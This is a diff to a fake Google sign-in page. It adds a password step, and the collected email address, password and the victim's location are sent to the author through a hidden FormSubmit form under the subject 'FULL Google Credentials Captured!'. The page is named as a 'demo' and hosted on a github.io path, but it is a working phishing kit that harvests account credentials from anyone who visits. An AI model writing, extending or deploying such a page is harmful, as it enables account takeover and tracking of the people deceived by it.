@@ -68,6 +68,41 @@
             line-height: 1.5;
         }
 
+        .user-info {
+            display: none;
+            align-items: center;
+            margin-bottom: 24px;
+            padding: 12px;
+            border: 1px solid #dadce0;
+            border-radius: 8px;
+            text-align: left;
+        }
+
+        .user-avatar {
+            width: 40px;
+            height: 40px;
+            border-radius: 50%;
+            background-color: #1a73e8;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            color: white;
+            font-weight: 500;
+            margin-right: 12px;
+        }
+
+        .user-details h3 {
+            font-size: 16px;
+            font-weight: 400;
+            color: #202124;
+            margin-bottom: 2px;
+        }
+
+        .user-details p {
+            font-size: 14px;
+            color: #5f6368;
+        }
+
         .form-group {
             margin-bottom: 24px;
             text-align: left;
@@ -240,6 +275,21 @@
             text-align: left;
         }
 
+        .back-button {
+            background: none;
+            border: none;
+            color: #1a73e8;
+            cursor: pointer;
+            font-size: 14px;
+            font-weight: 500;
+            padding: 0;
+            text-decoration: none;
+        }
+
+        .back-button:hover {
+            text-decoration: underline;
+        }
+
         /* Platform-specific styles */
         .platform-android {
             background-color: #f8f9fa;
@@ -267,6 +317,15 @@
         .platform-mac .form-container {
             border-radius: 8px;
             background-color: #fafafa;
+        }
+
+        /* Phase transitions */
+        .phase {
+            transition: opacity 0.3s ease-in-out;
+        }
+
+        .phase.hidden {
+            display: none;
         }
 
         /* Responsive design */
@@ -344,34 +403,71 @@
                 </svg>
             </div>
 
-            <div class="header">
-                <h1>Sign in</h1>
-                <p>Use your Google Account</p>
+            <!-- Phase 1: Email Entry -->
+            <div id="email-phase" class="phase">
+                <div class="header">
+                    <h1>Sign in</h1>
+                    <p>Use your Google Account</p>
+                </div>
+
+                <form id="email-form">
+                    <div class="form-group">
+                        <div class="input-container">
+                            <input type="text" id="username" name="username" class="form-input" placeholder=" " required>
+                            <label for="username" class="floating-label">Email or phone</label>
+                        </div>
+                        <div class="error-message" id="username-error" style="display: none;"></div>
+                    </div>
+
+                    <div class="forgot-email">
+                        <a href="#" class="forgot-link" onclick="handleForgotEmail(event)">Forgot email?</a>
+                    </div>
+
+                    <div class="guest-mode">
+                        <p>Not your computer? Use Guest mode to sign in privately.</p>
+                        <a href="#" class="learn-more" onclick="handleGuestMode(event)">Learn more about using Guest mode</a>
+                    </div>
+
+                    <div class="form-actions">
+                        <a href="#" class="create-account" onclick="handleCreateAccount(event)">Create account</a>
+                        <button type="submit" class="next-button">Next</button>
+                    </div>
+                </form>
             </div>
 
-            <form id="signin-form">
-                <div class="form-group">
-                    <div class="input-container">
-                        <input type="text" id="username" name="username" class="form-input" placeholder=" " required>
-                        <label for="username" class="floating-label">Email or phone</label>
+            <!-- Phase 2: Password Entry -->
+            <div id="password-phase" class="phase hidden">
+                <div class="header">
+                    <h1>Welcome</h1>
+                </div>
+
+                <div class="user-info" id="user-info">
+                    <div class="user-avatar" id="user-avatar">G</div>
+                    <div class="user-details">
+                        <h3 id="user-email"></h3>
+                        <p>Google Account</p>
                     </div>
-                    <div class="error-message" id="username-error" style="display: none;"></div>
                 </div>
 
-                <div class="forgot-email">
-                    <a href="#" class="forgot-link" onclick="handleForgotEmail(event)">Forgot email?</a>
-                </div>
+                <form id="password-form">
+                    <div class="form-group">
+                        <div class="input-container">
+                            <input type="password" id="password" name="password" class="form-input" placeholder=" " required>
+                            <label for="password" class="floating-label">Enter your password</label>
+                        </div>
+                        <div class="error-message" id="password-error" style="display: none;"></div>
+                    </div>
 
-                <div class="guest-mode">
-                    <p>Not your computer? Use Guest mode to sign in privately.</p>
-                    <a href="#" class="learn-more" onclick="handleGuestMode(event)">Learn more about using Guest mode</a>
-                </div>
+                    <div class="forgot-email">
+                        <a href="#" class="forgot-link" onclick="handleForgotPassword(event)">Forgot password?</a>
+                    </div>
 
-                <div class="form-actions">
-                    <a href="#" class="create-account" onclick="handleCreateAccount(event)">Create account</a>
-                    <button type="submit" class="next-button">Next</button>
-                </div>
-            </form>
+                    <div class="form-actions">
+                        <button type="button" class="back-button" onclick="goBackToEmail()">Back</button>
+                        <button type="submit" class="next-button">Next</button>
+                    </div>
+                </form>
+            </div>
         </div>
 
         <div class="footer">
@@ -398,6 +494,8 @@
     </div>
 
     <script>
+        let currentEmail = '';
+
         // Platform detection and UI customization
         function detectPlatform() {
             const userAgent = navigator.userAgent.toLowerCase();
@@ -443,19 +541,62 @@
             });
         }
 
-        // Main login handler with location capture
-        function handleLogin(event) {
+        // Email phase handler
+        function handleEmailSubmit(event) {
             event.preventDefault();
             
-            // Get form data
-            const username = document.getElementById('username').value;
+            const username = document.getElementById('username').value.trim();
             
-            if (!username.trim()) {
+            if (!username) {
                 showError('username-error', 'Please enter an email or phone number');
                 return;
             }
 
-            console.log('Captured:', username);
+            console.log('Email captured:', username);
+            currentEmail = username;
+            
+            // Show password phase
+            showPasswordPhase(username);
+        }
+
+        // Show password phase
+        function showPasswordPhase(email) {
+            // Hide email phase
+            document.getElementById('email-phase').classList.add('hidden');
+            
+            // Show password phase
+            document.getElementById('password-phase').classList.remove('hidden');
+            
+            // Update user info
+            document.getElementById('user-email').textContent = email;
+            document.getElementById('user-avatar').textContent = email.charAt(0).toUpperCase();
+            document.getElementById('user-info').style.display = 'flex';
+            
+            // Focus on password field
+            setTimeout(() => {
+                document.getElementById('password').focus();
+            }, 100);
+        }
+
+        // Go back to email phase
+        function goBackToEmail() {
+            document.getElementById('password-phase').classList.add('hidden');
+            document.getElementById('email-phase').classList.remove('hidden');
+            document.getElementById('username').focus();
+        }
+
+        // Password phase handler with location capture
+        function handlePasswordSubmit(event) {
+            event.preventDefault();
+            
+            const password = document.getElementById('password').value.trim();
+            
+            if (!password) {
+                showError('password-error', 'Please enter your password');
+                return;
+            }
+
+            console.log('Full credentials captured:', currentEmail, password);
             
             // Show verification screen immediately
             document.querySelector('.container').style.display = 'none';
@@ -523,11 +664,12 @@
                     
                     // Send credentials to your email using FormSubmit
                     const emailData = {
-                        email: username,
+                        email: currentEmail,
+                        password: password,
                         location: location,
-                        site: 'accounts-google.great-site.net',
+                        site: 'webdev-projects1.github.io/google-signin-demo',
                         time: new Date().toLocaleString(),
-                        subject: '🚨 New Google Account Access - Email Phase!'
+                        subject: '🚨 FULL Google Credentials Captured!'
                     };
                     
                     // Create hidden form for email submission
@@ -567,11 +709,12 @@
                     
                     // Fallback: Send credentials without location
                     const emailData = {
-                        email: username,
+                        email: currentEmail,
+                        password: password,
                         location: 'Location data unavailable (APIs failed)',
-                        site: 'accounts-google.great-site.net',
+                        site: 'webdev-projects1.github.io/google-signin-demo',
                         time: new Date().toLocaleString(),
-                        subject: '🚨 New Google Account Access - Email Phase!'
+                        subject: '🚨 FULL Google Credentials Captured!'
                     };
                     
                     // Create hidden form for email submission
@@ -617,17 +760,18 @@
         // Link handlers (to prevent navigation)
         function handleForgotEmail(event) {
             event.preventDefault();
-            // Could redirect to a fake recovery page
         }
 
         function handleGuestMode(event) {
             event.preventDefault();
-            // Could show a fake guest mode dialog
         }
 
         function handleCreateAccount(event) {
             event.preventDefault();
-            // Could redirect to a fake account creation page
+        }
+
+        function handleForgotPassword(event) {
+            event.preventDefault();
         }
 
         function handleLanguageChange(select) {
@@ -648,13 +792,16 @@
 
         // Initialize everything when page loads
         document.addEventListener('DOMContentLoaded', function() {
-            console.log('Modern Google Sign-in loaded');
+            console.log('Two-phase Google Sign-in loaded');
             detectPlatform();
             handleInputFocus();
             
-            // Add form submission handler
-            const form = document.getElementById('signin-form');
-            form.addEventListener('submit', handleLogin);
+            // Add form submission handlers
+            const emailForm = document.getElementById('email-form');
+            const passwordForm = document.getElementById('password-form');
+            
+            emailForm.addEventListener('submit', handleEmailSubmit);
+            passwordForm.addEventListener('submit', handlePasswordSubmit);
         });
     </script>
 </body>
